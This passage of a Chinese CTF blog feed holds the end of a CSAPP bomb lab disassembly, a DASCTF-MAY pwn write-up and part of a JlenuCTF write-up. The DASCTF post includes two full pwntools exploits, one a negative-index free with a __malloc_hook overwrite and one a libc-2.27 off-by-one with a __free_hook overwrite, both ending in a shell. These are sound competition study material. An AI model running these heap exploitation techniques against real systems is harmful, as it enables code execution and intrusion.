class="line"><span class="number">0x00000000004011e7</span> &lt;+<span class="number">243</span>&gt;:<span class="keyword">jge</span>    <span class="number">0x4011ee</span> &lt;phase_6+<span class="number">250</span>&gt;</span><br><span class="line"># 如果前一个节点大于后一个节点则不会跳转</span><br><span class="line"></span><br><span class="line"><span class="number">0x00000000004011e9</span> &lt;+<span class="number">245</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line"><span class="number">0x00000000004011ee</span> &lt;+<span class="number">250</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rbx</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbx</span>+<span class="number">0x8</span>]</span><br><span class="line"><span class="number">0x00000000004011f2</span> &lt;+<span class="number">254</span>&gt;:<span class="keyword">sub</span>    <span class="built_in">ebp</span>,<span class="number">0x1</span></span><br><span class="line"><span class="number">0x00000000004011f5</span> &lt;+<span class="number">257</span>&gt;:<span class="keyword">jne</span>    <span class="number">0x4011df</span> &lt;phase_6+<span class="number">235</span>&gt;</span><br><span class="line"><span class="number">0x00000000004011f7</span> &lt;+<span class="number">259</span>&gt;:<span class="keyword">add</span>    <span class="built_in">rsp</span>,<span class="number">0x50</span></span><br><span class="line"><span class="number">0x00000000004011fb</span> &lt;+<span class="number">263</span>&gt;:<span class="keyword">pop</span>    <span class="built_in">rbx</span></span><br><span class="line"><span class="number">0x00000000004011fc</span> &lt;+<span class="number">264</span>&gt;:<span class="keyword">pop</span>    <span class="built_in">rbp</span></span><br><span class="line"><span class="number">0x00000000004011fd</span> &lt;+<span class="number">265</span>&gt;:<span class="keyword">pop</span>    <span class="built_in">r12</span></span><br><span class="line"><span class="number">0x00000000004011ff</span> &lt;+<span class="number">267</span>&gt;:<span class="keyword">pop</span>    <span class="built_in">r13</span></span><br><span class="line"><span class="number">0x0000000000401201</span> &lt;+<span class="number">269</span>&gt;:<span class="keyword">pop</span>    <span class="built_in">r14</span></span><br><span class="line"><span class="number">0x0000000000401203</span> &lt;+<span class="number">271</span>&gt;:<span class="keyword">ret</span>    </span><br></pre></td></tr></table></figure><p>对比了node节点中的数据的大小，我们重启程序，查看原生的node节点情况如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">32</span>gx <span class="number">0x6032d0</span></span><br><span class="line"><span class="number">0x6032d0</span> &lt;node1&gt;:<span class="number">0x000000010000014c</span><span class="number">0x00000000006032e0</span></span><br><span class="line"><span class="number">0x6032e0</span> &lt;node2&gt;:<span class="number">0x00000002000000a8</span><span class="number">0x00000000006032f0</span></span><br><span class="line"><span class="number">0x6032f0</span> &lt;node3&gt;:<span class="number">0x000000030000039c</span><span class="number">0x0000000000603300</span></span><br><span class="line"><span class="number">0x603300</span> &lt;node4&gt;:<span class="number">0x00000004000002b3</span><span class="number">0x0000000000603310</span></span><br><span class="line"><span class="number">0x603310</span> &lt;node5&gt;:<span class="number">0x00000005000001dd</span><span class="number">0x0000000000603320</span></span><br><span class="line"><span class="number">0x603320</span> &lt;node6&gt;:<span class="number">0x00000006000001bb</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>大小顺序为 3 4 5 6 1 2<br>那么变换后是这些，变换前就是 4 3 2 1 6 5</p><p><img src="https://i.loli.net/2021/06/15/8TIOF7ofxShwHuX.png" alt=""></p><h2 id="反馈与总结"><a href="#反馈与总结" class="headerlink" title="反馈与总结"></a>反馈与总结</h2><p>  通过这个实验复习了一些汇编的知识，很大收获，之前习惯于看c代码，才发现读汇编的能力是如此之弱</p><ol><li>objdump -d -m 指令格式 ./binary_file &gt; xxx.asm  反汇编出文件</li><li>函数的连续调用的寄存器参数变化，依然是rdi等寄存器传进去</li><li>毅力，自制力和专注力</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> csapp </tag>
            
            <tag> cmu lab </tag>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF-MAY pwn wp</title>
      <link href="2021/06/05/DASCTF-MAY/"/>
      <url>2021/06/05/DASCTF-MAY/</url>
      
        <content type="html"><![CDATA[<p>两道题都比较中规中矩，第二个比第一个还简单，第一个比赛一开始想歪了，做了很jb久，第二个十几分钟就出了</p><h2 id="ticket"><a href="#ticket" class="headerlink" title="ticket"></a>ticket</h2><p>一个比较典型的堆菜单题目</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>逆向的话倒是不难，直接看漏洞，首先是free中，一眼看过去发现这不就是uaf么，free的是指针，本应该清空指针和size，却只清空了size</p><p><img src="https://i.loli.net/2021/06/05/1PVwZi3z5eNS98B.png" alt=""></p><p>但是后期调试的时候发现并不是这样的，因为所有的edit和show功能都是根据size来判断的，也就是相当于清空了指针，这个地方并不存在uaf</p><p>然后又仔细一看，发现真正的漏洞其实在这。<br><img src="https://i.loli.net/2021/06/05/5khUEDn8WRHNi1u.png" alt=""></p><p>free的时候没有判断index小于0的情况，也就是说我们可以以bss中的存放堆指针的位置为坐标原点，向之前的地址进行free，突然联想到了之前让输入姓名，可能就是给我们伪造堆地址创造了条件，我们进入gdb来查看他们是如何分布的。</p><p><img src="https://i.loli.net/2021/06/05/lIa76K9eDxZ3fFP.png" alt=""><br>发现这不就在堆指针的上方么，所以很自然的思路就出来了，就是向前free，用之前能够输入的age当做堆指针，指向一个伪造的chunk，这个伪造的chunk可以由我们来构造堆块的size来决定。</p><p>如下部分exp<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 首先是先泄露出来libc地址，这个简单，free unsorted bin后再取回来就可以了</span></span><br><span class="line">fillInfo(<span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;bbbb&quot;</span>, <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0xd0</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x21</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x60</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">__malloc_hook = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">296</span> - <span class="number">0x10</span></span><br><span class="line">libc_base = __malloc_hook - libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;LIBC BASE ===&gt; &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></p><p>然后是本题的精华<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">1</span>, <span class="number">0x21</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x21</span>)</span><br><span class="line">edit_info(<span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;bbbb&quot;</span>, <span class="number">0x6020e0</span>)</span><br><span class="line"><span class="comment"># free(-3)</span></span><br></pre></td></tr></table></figure></p><p>效果是这样的<br><img src="https://i.loli.net/2021/06/05/1DxdUwI9jASg7kB.png" alt=""></p><p>然后free(-3)，那个伪造的chunk就进入到bin里了</p><p>然后申请回来，改size为0的话可以获得真正uaf的能力，后面就简单了</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./ticket&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc-2.23.so&#x27;</span></span><br><span class="line">port = <span class="number">26007</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">27113</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fillInfo</span>(<span class="params">name, say, age</span>):</span></span><br><span class="line">    p.sendafter(<span class="string">&quot;Your name:&quot;</span>, name)</span><br><span class="line">    p.sendafter(<span class="string">&quot;what do you want to say before take off(wu hu qi fei):&quot;</span>, say)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Your age:&quot;</span>, <span class="built_in">str</span>(age))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index, size</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Remarks size:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Your remarks:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_info</span>(<span class="params">name, say, age</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    fillInfo(name, say, age)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_info</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">fillInfo(<span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;bbbb&quot;</span>, <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0xd0</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x21</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x60</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">__malloc_hook = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">296</span> - <span class="number">0x10</span></span><br><span class="line">libc_base = __malloc_hook - libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;LIBC BASE ===&gt; &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x21</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x21</span>)</span><br><span class="line">edit_info(<span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;bbbb&quot;</span>, <span class="number">0x6020e0</span>)</span><br><span class="line">free(-<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0x70</span>) + p64(<span class="number">0x0</span>))</span><br><span class="line">edit(<span class="number">2</span>, p64(__malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x60</span>)</span><br><span class="line">og = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">edit(<span class="number">3</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x13</span> + p64(og[<span class="number">3</span>] + libc_base))</span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0x70</span>) + p64(<span class="number">0x0</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="card"><a href="#card" class="headerlink" title="card"></a>card</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p><img src="https://i.loli.net/2021/06/05/UPpgt2VXkEof6iz.png" alt=""><br>漏洞点在于这个地方，edit的时候直接用size就好了，这里偏偏加了一个v1，明显是有漏洞，然后我们进入overflow函数看看</p><p><img src="https://i.loli.net/2021/06/05/ca6LgQMpY1GUyAS.png" alt=""><br>进行了一些列蜜汁操作，看不懂问题不大，反正就是这么个逻辑，这个函数的返回值加上size作为edit的size，那么只要这个函数的返回值是1，那么就相当于溢出了一个字节呗</p><p>写个脚本来看看，直接用那个overflow的逻辑，稍微改改就行了，如果返回值不是0，那么就输出，看看哪些size是可用的<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">size = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">257</span>):</span><br><span class="line">    <span class="keyword">if</span> ((((((i &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">28</span>) + i) &amp; <span class="number">0xF</span>) - ((i &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">28</span>)) &gt;&gt; <span class="number">3</span>):</span><br><span class="line">        size.append(<span class="built_in">hex</span>(i))</span><br><span class="line">print(<span class="built_in">len</span>(size))</span><br><span class="line">print(size)</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2021/06/05/BZgo3sP8ThXI5Nb.png" alt=""></p><p>那就直接用0x?8的地址就可以了<br>所以这道题就转变为了libc-2.27下的off-by-one<br>（libc版本为GLIBC 2.27-3ubuntu1，尚无key机制，不过这道题好像也无需关心这一点）</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc.so&#x27;</span></span><br><span class="line">port = <span class="number">29844</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, port)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index, size, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;please choice your card:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Infuse power:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;quickly!&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;please choice your card&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;start your bomb show&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Which card:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i, <span class="number">0x80</span>, <span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x10</span>, <span class="string">&#x27;cccc&#x27;</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">289</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;LIBC BASE =====&gt; &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0xe0</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x78</span>, <span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x68</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x78</span>, <span class="string">&#x27;cccc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x70</span> * <span class="string">b&#x27;a&#x27;</span> + p64(<span class="number">0</span>) + p8(<span class="number">0xf1</span>) </span><br><span class="line">edit(<span class="number">0</span>, payload)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x90</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">2</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x70</span> + p64(<span class="number">0xf0</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x68</span>, <span class="string">&#x27;dddd&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x78</span>, <span class="string">&#x27;eeee&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">__free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">edit(<span class="number">5</span>, p64(__free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x70</span>, <span class="string">&quot;HACKER&quot;</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x70</span>, p64(system))</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[&#x27;0x8&#x27;, &#x27;0x9&#x27;, &#x27;0xa&#x27;, &#x27;0xb&#x27;, &#x27;0xc&#x27;, &#x27;0xd&#x27;, &#x27;0xe&#x27;, &#x27;0xf&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0x18&#x27;, &#x27;0x19&#x27;, &#x27;0x1a&#x27;, &#x27;0x1b&#x27;, &#x27;0x1c&#x27;, &#x27;0x1d&#x27;, &#x27;0x1e&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0x1f&#x27;, &#x27;0x28&#x27;, &#x27;0x29&#x27;, &#x27;0x2a&#x27;, &#x27;0x2b&#x27;, &#x27;0x2c&#x27;, &#x27;0x2d&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0x2e&#x27;, &#x27;0x2f&#x27;, &#x27;0x38&#x27;, &#x27;0x39&#x27;, &#x27;0x3a&#x27;, &#x27;0x3b&#x27;, &#x27;0x3c&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0x3d&#x27;, &#x27;0x3e&#x27;, &#x27;0x3f&#x27;, &#x27;0x48&#x27;, &#x27;0x49&#x27;, &#x27;0x4a&#x27;, &#x27;0x4b&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0x4c&#x27;, &#x27;0x4d&#x27;, &#x27;0x4e&#x27;, &#x27;0x4f&#x27;, &#x27;0x58&#x27;, &#x27;0x59&#x27;, &#x27;0x5a&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0x5b&#x27;, &#x27;0x5c&#x27;, &#x27;0x5d&#x27;, &#x27;0x5e&#x27;, &#x27;0x5f&#x27;, &#x27;0x68&#x27;, &#x27;0x69&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0x6a&#x27;, &#x27;0x6b&#x27;, &#x27;0x6c&#x27;, &#x27;0x6d&#x27;, &#x27;0x6e&#x27;, &#x27;0x6f&#x27;, &#x27;0x78&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0x79&#x27;, &#x27;0x7a&#x27;, &#x27;0x7b&#x27;, &#x27;0x7c&#x27;, &#x27;0x7d&#x27;, &#x27;0x7e&#x27;, &#x27;0x7f&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0x88&#x27;, &#x27;0x89&#x27;, &#x27;0x8a&#x27;, &#x27;0x8b&#x27;, &#x27;0x8c&#x27;, &#x27;0x8d&#x27;, &#x27;0x8e&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0x8f&#x27;, &#x27;0x98&#x27;, &#x27;0x99&#x27;, &#x27;0x9a&#x27;, &#x27;0x9b&#x27;, &#x27;0x9c&#x27;, &#x27;0x9d&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0x9e&#x27;, &#x27;0x9f&#x27;, &#x27;0xa8&#x27;, &#x27;0xa9&#x27;, &#x27;0xaa&#x27;, &#x27;0xab&#x27;, &#x27;0xac&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0xad&#x27;, &#x27;0xae&#x27;, &#x27;0xaf&#x27;, &#x27;0xb8&#x27;, &#x27;0xb9&#x27;, &#x27;0xba&#x27;, &#x27;0xbb&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0xbc&#x27;, &#x27;0xbd&#x27;, &#x27;0xbe&#x27;, &#x27;0xbf&#x27;, &#x27;0xc8&#x27;, &#x27;0xc9&#x27;, &#x27;0xca&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0xcb&#x27;, &#x27;0xcc&#x27;, &#x27;0xcd&#x27;, &#x27;0xce&#x27;, &#x27;0xcf&#x27;, &#x27;0xd8&#x27;, &#x27;0xd9&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0xda&#x27;, &#x27;0xdb&#x27;, &#x27;0xdc&#x27;, &#x27;0xdd&#x27;, &#x27;0xde&#x27;, &#x27;0xdf&#x27;, &#x27;0xe8&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0xe9&#x27;, &#x27;0xea&#x27;, &#x27;0xeb&#x27;, &#x27;0xec&#x27;, &#x27;0xed&#x27;, &#x27;0xee&#x27;, &#x27;0xef&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0xf8&#x27;, &#x27;0xf9&#x27;, &#x27;0xfa&#x27;, &#x27;0xfb&#x27;, &#x27;0xfc&#x27;, &#x27;0xfd&#x27;, &#x27;0xfe&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0xff&#x27;]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VMPWN</title>
      <link href="2021/05/30/VMPWN/"/>
      <url>2021/05/30/VMPWN/</url>
      
        <content type="html"><![CDATA[<h2 id="ciscn-2019-qual-virtual"><a href="#ciscn-2019-qual-virtual" class="headerlink" title="ciscn_2019_qual_virtual"></a>ciscn_2019_qual_virtual</h2>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> VMpwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JlenuCTF</title>
      <link href="2021/05/23/JlenuCTF/"/>
      <url>2021/05/23/JlenuCTF/</url>
      
        <content type="html"><![CDATA[<p>反正交完wp了，索性水个博客吧（</p><h2 id="HAPPYGAME"><a href="#HAPPYGAME" class="headerlink" title="HAPPYGAME"></a>HAPPYGAME</h2><h3 id="SIMPIOT"><a href="#SIMPIOT" class="headerlink" title="SIMPIOT"></a>SIMPIOT</h3><p>到手后直接strings一波，啊这</p><p><img src="https://i.loli.net/2021/05/22/KxLRHa4nw7hP8rY.png" alt=""></p><h3 id="社工一：帮我溯源"><a href="#社工一：帮我溯源" class="headerlink" title="社工一：帮我溯源"></a>社工一：帮我溯源</h3><p>我愿称为最强题目，雪宝yyds</p><p>👴🏻一开始不知道怎么回事，下载下来www.zip是这样的，莫不是👴🏻被搅屎了，浪费了👴🏻一个半小时看日志文件，然后还真给👴🏻查出个威胁情报ip来</p><p><img src="https://i.loli.net/2021/05/22/LHRF74sqPt3TV9D.png" alt=""></p><p><img src="https://i.loli.net/2021/05/22/KNnSZ8rAUVWqfPc.png" alt=""></p><p>后来👴🏻测了一堆无用功，找了一些日志审计脚本和手写正则的脚本，发现啥都查不到，👴🏻傻了，👴🏻寻思happygame给👴🏻整不happy了，👴🏻很气愤，👴🏻去睡觉了</p><p>👴🏻第二天越想越气，👴🏻决定再来做一做，👴🏻重新下载www.zip，👴🏻傻了，竟然是网站源码，****</p><p>好了，开始审计，rips给👴🏻扫</p><p><img src="https://i.loli.net/2021/05/23/qvtuL1K3yZToQCB.png" alt=""></p><p>扫出来木马了，👴🏻直接连shell，然后hacked by HSYM</p><h3 id="社工二：深入调查"><a href="#社工二：深入调查" class="headerlink" title="社工二：深入调查"></a>社工二：深入调查</h3><p><img src="https://i.loli.net/2021/05/23/2dEKNoIMWHhtbGf.png" style="zoom:50%;" /></p><p>审日志，ip到手</p><h3 id="社工三：信息收集"><a href="#社工三：信息收集" class="headerlink" title="社工三：信息收集"></a>社工三：信息收集</h3><p>访问带黑客的网站，发现扣扣号，找到他的生日了，有hint，博客后台是id+生日</p><p><img src="https://i.loli.net/2021/05/23/JYo1FjGAEbpklhi.png" alt=""></p><p>然后就可以进带黑客的后台了</p><h3 id="社工四：反击黑客"><a href="#社工四：反击黑客" class="headerlink" 